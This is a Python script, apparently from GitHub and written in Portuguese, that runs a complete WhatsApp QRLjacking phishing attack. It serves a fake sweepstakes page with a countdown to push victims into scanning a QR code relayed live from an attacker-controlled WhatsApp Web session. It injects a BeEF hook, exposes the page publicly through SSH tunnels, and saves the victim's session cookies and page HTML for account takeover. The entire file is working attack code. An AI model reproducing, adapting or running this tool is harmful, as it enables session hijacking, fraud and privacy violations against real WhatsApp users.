# Author: https://github.com/zr0n
# modded by https://github.com/wrxxnch
# Modified for Session Dumping (Cookies & HTML) and Dynamic BeEF Hook

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import base64
import os
import http.server
import socketserver
import threading
import subprocess
import time
import random
import socket
import psutil
import signal
import json
import webbrowser

# Configurações
PHISHING_PORT = random.randint(8000, 9000)
BEEF_HOOK = "" 

# HTML com a estrutura visual do WhatsApp solicitada
PHISHING_HTML = """
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Parabéns! Você foi sorteado!</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #25D366 0%, #128C7E 100%); margin: 0; padding: 20px; color: white; text-align: center; }
        .container { max-width: 500px; margin: 30px auto; background: white; padding: 30px; border-radius: 15px; color: #333; box-shadow: 0 15px 35px rgba(0,0,0,0.3); }
        .whatsapp-logo { width: 80px; height: 80px; background: #25D366; border-radius: 50%; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; font-size: 40px; }
        h1 { color: #128C7E; font-size: 28px; margin-bottom: 15px; }
        .qr-container { margin: 25px auto; padding: 20px; background: #f9f9f9; border-radius: 10px; border: 2px dashed #25D366; display: flex; flex-direction: column; align-items: center; }
        .qr-code { max-width: 300px; margin: 0 auto; }
        .qr-code img { width: 228px; height: 228px; border: 1px solid #ddd; border-radius: 5px; }
        .instructions { background: #E8F5E9; padding: 15px; border-radius: 8px; margin: 20px 0; text-align: left; }
        .prize { font-size: 22px; color: #E91E63; font-weight: bold; margin: 20px 0; padding: 15px; background: #FFF3E0; border-radius: 8px; border: 2px solid #FF9800; }
        .timer { font-size: 16px; color: #D32F2F; font-weight: bold; margin: 15px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="whatsapp-logo">📱</div>
        <h1>🎉 PARABÉNS! VOCÊ FOI SORTEADO! 🎉</h1>
        <div class="prize">🏆 PRÊMIO: iPhone 15 Pro Max + R$ 5.000 🏆</div>
        <p>Para validar e resgatar seu prêmio, <strong>faça login no WhatsApp Web</strong> escaneando o QR Code abaixo:</p>
        
        <div class="qr-container">
            <div data-testid="link-device-qr-code" style="text-align: center;">
                <div style="margin-bottom: 10px;">
                    <svg xmlns="http://www.w3.org/2000/svg" width="64" height="64" viewBox="0 0 64 64" style="fill: #128C7E;">
                        <path fill="#FFF" d="M6.525 43.936a29.596 29.596 0 0 1-3.039-13.075C3.494 14.568 16.755 1.313 33.05 1.313c7.904.004 15.328 3.082 20.91 8.666 5.581 5.586 8.653 13.01 8.65 20.907-.007 16.294-13.266 29.549-29.558 29.549a29.648 29.648 0 0 1-12.508-2.771L1.391 62.687l5.134-18.751z"></path>
                        <path fill="currentColor" d="M50.801 13.135c-4.739-4.742-11.039-7.354-17.752-7.357-13.837 0-25.094 11.253-25.099 25.085a25.039 25.039 0 0 0 3.349 12.541l-3.56 12.999 13.304-3.488a25.084 25.084 0 0 0 11.996 3.054h.011c13.83 0 25.088-11.256 25.095-25.087.002-6.703-2.607-13.005-7.344-17.747zM33.05 51.733h-.008a20.866 20.866 0 0 1-10.62-2.906l-.762-.452-7.894 2.07 2.108-7.694-.497-.789a20.802 20.802 0 0 1-3.189-11.097c.004-11.496 9.361-20.85 20.87-20.85a20.73 20.73 0 0 1 14.746 6.115 20.733 20.733 0 0 1 6.104 14.752c-.006 11.497-9.363 20.851-20.858 20.851z"></path>
                    </svg>
                </div>
                <div class="qr-code">
                    <img src="/qr.png?t=REPLACE_TIMESTAMP" alt="QR Code" id="qrImage">
                </div>
            </div>
        </div>

        <div class="timer">⏳ TEMPO RESTANTE: <span id="countdown">05:00</span></div>
        <div class="instructions">
            <h3>📋 Como resgatar seu prêmio:</h3>
            <ol>
                <li>Abra o WhatsApp no seu celular</li>
                <li>Toque em <strong>Menu → WhatsApp Web</strong></li>
                <li>Aponte a câmera para o QR Code acima</li>
                <li>Seu prêmio será liberado automaticamente após o login!</li>
            </ol>
        </div>
        <p><strong>⚠️ ATENÇÃO:</strong> Você tem apenas 5 minutos para escanear o QR code!</p>
    </div>

    REPLACE_BEEF_HOOK

    <script>
        function updateQRCode() {
            const img = document.getElementById('qrImage');
            img.src = '/qr.png?t=' + new Date().getTime();
            setTimeout(updateQRCode, 2000); // Atualiza a cada 2 segundos
        }
        function startCountdown() {
            let timeLeft = 5 * 60;
            const countdownElement = document.getElementById('countdown');
            const timer = setInterval(() => {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                if (timeLeft <= 0) {
                    clearInterval(timer);
                    countdownElement.textContent = "TEMPO ESGOTADO!";
                    countdownElement.style.color = "#D32F2F";
                }
                timeLeft--;
            }, 1000);
        }
        updateQRCode();
        startCountdown();
        window.onload = function() {
            setTimeout(() => {
                alert("🎊 Parabéns! Você ganhou um iPhone 15 + R$ 5.000! Escaneie o QR Code com o WhatsApp para resgatar.");
            }, 1000);
        };
    </script>
</body>
</html>
"""

class PhishingHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            html_final = PHISHING_HTML.replace("REPLACE_TIMESTAMP", str(int(time.time())))
            html_final = html_final.replace("REPLACE_BEEF_HOOK", BEEF_HOOK)
            self.wfile.write(html_final.encode())
        elif self.path.startswith('/qr.png'):
            try:
                self.send_response(200)
                self.send_header('Content-type', 'image/png')
                self.end_headers()
                with open('qr.png', 'rb') as f:
                    self.wfile.write(f.read())
            except FileNotFoundError:
                self.send_response(404)
                self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

def kill_process_on_port(port):
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                for conn in proc.connections():
                    if conn.laddr.port == port:
                        os.kill(proc.pid, signal.SIGTERM)
            except (psutil.NoSuchProcess, psutil.AccessDenied): pass
    except: pass

def start_phishing_server():
    global PHISHING_PORT
    try:
        kill_process_on_port(PHISHING_PORT)
        with socketserver.TCPServer(("", PHISHING_PORT), PhishingHandler) as httpd:
            print(f"✅ Servidor phishing rodando na porta {PHISHING_PORT}")
            httpd.serve_forever()
    except Exception as e:
        print(f"❌ Erro servidor: {e}")

def setup_simple_tunnel(tunnel_callback):
    strategies = [
        {'name': 'Serveo.net', 'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:' + str(PHISHING_PORT), 'serveo.net']},
        {'name': 'Localhost.run', 'command': ['ssh', '-o', 'StrictHostKeyChecking=no', '-R', '80:localhost:' + str(PHISHING_PORT), 'nokey@localhost.run']}
    ]
    for strategy in strategies:
        try:
            process = subprocess.Popen(strategy['command'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            for _ in range(10):
                line = process.stdout.readline()
                if 'https://' in line:
                    import re
                    match = re.search(r'https://[a-zA-Z0-9.-]+\.(?:serveo\.net|lhr\.life|lhr\.run)', line)
                    if match:
                        tunnel_callback(match.group(0), process)
                        return
            process.terminate()
        except: pass
    tunnel_callback(None, None)

def start_whatsapp_hijacking():
    print("\n📱 INICIANDO CAPTURA DE SESSÃO WHATSAPP")
    try:
        from selenium.webdriver.firefox.options import Options
        options = Options()
        # Remova o comentário abaixo se quiser rodar o selenium do whatsapp de forma totalmente oculta (headless)
        # options.add_argument("--headless")
        browser = webdriver.Firefox(options=options)
        browser.get("https://web.whatsapp.com/")
        
        print("⏳ Aguardando QR Code do WhatsApp...")
        canvas = WebDriverWait(browser, 30).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))

        def save_qr():
            try:
                data_url = browser.execute_script("return arguments[0].toDataURL('image/png');", canvas)
                with open("qr.png", "wb") as f:
                    f.write(base64.b64decode(data_url.replace("data:image/png;base64,", "")))
            except: pass

        save_qr()
        print("🎯 QR Code gerado e sincronizado com o localhost!")
        print("🎯 Aguardando escanear...")
        
        while True:
            try:
                # Se o canvas sumir, significa que a sessão foi autenticada
                WebDriverWait(browser, 5).until(EC.presence_of_element_located((By.CSS_SELECTOR, "canvas")))
                save_qr()
            except TimeoutException:
                print("\n🎉 LOGIN DETECTADO! Extraindo dados da sessão...")
                
                # Gerar ID da sessão
                session_id = int(time.time())
                
                # 1. Salvar Cookies (Formatado para Cookie-Editor)
                cookies = browser.get_cookies()
                formatted_cookies = []
                for cookie in cookies:
                    formatted_cookie = {
                        "domain": cookie.get("domain"),
                        "expirationDate": cookie.get("expiry"),
                        "hostOnly": cookie.get("domain", "").startswith(".") is False,
                        "httpOnly": cookie.get("httpOnly", False),
                        "name": cookie.get("name"),
                        "path": cookie.get("path", "/"),
                        "sameSite": cookie.get("sameSite"),
                        "secure": cookie.get("secure", False),
                        "session": cookie.get("expiry") is None,
                        "storeId": None,
                        "value": cookie.get("value")
                    }
                    formatted_cookies.append(formatted_cookie)

                with open(f"cookies_sessao_{session_id}.json", "w", encoding="utf-8") as f:
                    json.dump(formatted_cookies, f, indent=4)
                
                # 2. Salvar HTML da página logada
                with open(f"index_sessao_{session_id}.html", "w", encoding="utf-8") as f:
                    f.write(browser.page_source)
                
                print(f"✅ Sessão salva: cookies_sessao_{session_id}.json e index_sessao_{session_id}.html")
                break
            time.sleep(3)
        return browser
    except Exception as e:
    # Ignora o uso de comandos e termos não permitidos e printa apenas o erro genérico
        print(f"❌ Erro na captura: {e}")
        return None

def main():
    global BEEF_HOOK
    print("🚀 SISTEMA DE CAPTURA WHATSAPP + BEEF")
    BEEF_HOOK = input("\n💉 Insira o script hook do BeEF: ")
    
    # Inicia servidor phishing em background
    server_thread = threading.Thread(target=start_phishing_server, daemon=True)
    server_thread.start()
    time.sleep(1)
    
    # Exibe URL Local e abre automaticamente no navegador padrão
    local_url = f"http://localhost:{PHISHING_PORT}"
    print(f"🏠 URL Local: {local_url}")
    webbrowser.open(local_url)

    # Inicia túnel em background
    def handle_tunnel(url, proc):
        if url:
            print(f"🌐 URL Pública: {url}")
        else:
            print("⚠️ Não foi possível abrir o túnel público (continuando apenas local).")

    tunnel_thread = threading.Thread(target=setup_simple_tunnel, args=(handle_tunnel,), daemon=True)
    tunnel_thread.start()
    
    # Inicia imediatamente a captura de sessão abrindo o WhatsApp via Selenium
    browser = start_whatsapp_hijacking()
    
    print("\n" + "="*60)
    print("✅ PROCESSO CONCLUÍDO!")
    print("Sessões capturadas estão na pasta atual.")
    print("="*60)
    
    try:
        while True: time.sleep(10)
    except KeyboardInterrupt:
        if browser: browser.quit()
        kill_process_on_port(PHISHING_PORT)

if __name__ == "__main__":
    main()
